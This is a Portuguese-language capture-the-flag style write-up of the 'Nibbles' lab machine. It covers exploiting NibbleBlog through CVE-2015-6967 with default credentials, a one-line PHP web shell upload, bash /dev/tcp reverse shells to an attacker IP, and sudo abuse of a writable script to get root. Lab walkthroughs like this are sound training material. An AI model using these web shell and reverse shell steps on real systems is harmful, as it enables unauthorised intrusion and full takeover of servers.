---
title: "Nibbles"
date: 2024-03-08
type: "labs"
difficulty: "Easy"
pwned: true
os: "Linux"
tags: ["linux", "web", "nibbleblog", "file-upload", "sudo", "cve-2015-6967"]
summary: "Linux box com NibbleBlog. Upload de plugin PHP malicioso para RCE, depois sudo no script bash para root."
machine_info:
  IP: "10.10.10.75"
  OS: "Linux (Ubuntu 16.04)"
  Dificuldade: "Easy"
  CVE: "CVE-2015-6967 (NibbleBlog File Upload)"
  Porta principal: "80/tcp (HTTP)"
---

## Reconhecimento

```bash
$ nmap -sC -sV 10.10.10.75
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2
80/tcp open  http    Apache httpd 2.4.18

$ curl -s http://10.10.10.75/ | grep -i nibble
<!-- /nibbleblog/ directory. -->
```

O código-fonte da página inicial já revela o diretório `/nibbleblog/`.

## Enumeração Web

```bash
$ gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/admin            (Status: 301)
/themes           (Status: 301)
/content          (Status: 301)
/plugins          (Status: 301)
```

Acessando `/nibbleblog/content/private/users.xml`:

```xml
<user username="admin">
    <id type="integer">0</id>
    <session_fail_count type="integer">0</session_fail_count>
    <session_date type="integer">1514544131</session_date>
</user>
```

Credenciais padrão: `admin:nibbles` (testando wordlist pequena ou guesswork).

## Exploração — CVE-2015-6967 (File Upload)

O plugin "My image" do NibbleBlog aceita upload de qualquer arquivo, incluindo PHP:

```bash
$ cat shell.php
<?php system($_GET['cmd']); ?>
```

1. Login em `http://10.10.10.75/nibbleblog/admin.php`
2. Plugins → My Image → Upload `shell.php` (ignore avisos)
3. Acesso ao shell:

```bash
$ curl "http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=id"
uid=1001(nibbler) gid=1001(nibbler)
```

## Reverse Shell

```bash
$ curl -G "http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'"
```

```bash
nibbler@Nibbles:/$ cat /home/nibbler/user.txt
79c03865431abca...
```

## Escalação de Privilégio — sudo

```bash
nibbler@Nibbles:~$ sudo -l
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

O script `monitor.sh` ainda não existe — podemos criá-lo:

```bash
nibbler@Nibbles:~$ mkdir -p personal/stuff
nibbler@Nibbles:~$ echo '#!/bin/bash' > personal/stuff/monitor.sh
nibbler@Nibbles:~$ echo 'bash -i >& /dev/tcp/10.10.14.X/5555 0>&1' >> personal/stuff/monitor.sh
nibbler@Nibbles:~$ chmod +x personal/stuff/monitor.sh
nibbler@Nibbles:~$ sudo /home/nibbler/personal/stuff/monitor.sh
```

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
de5e5d6619862a8a...
```

## Flags

```
user.txt → 79c03865431abca...
root.txt → de5e5d6619862a8a...
```
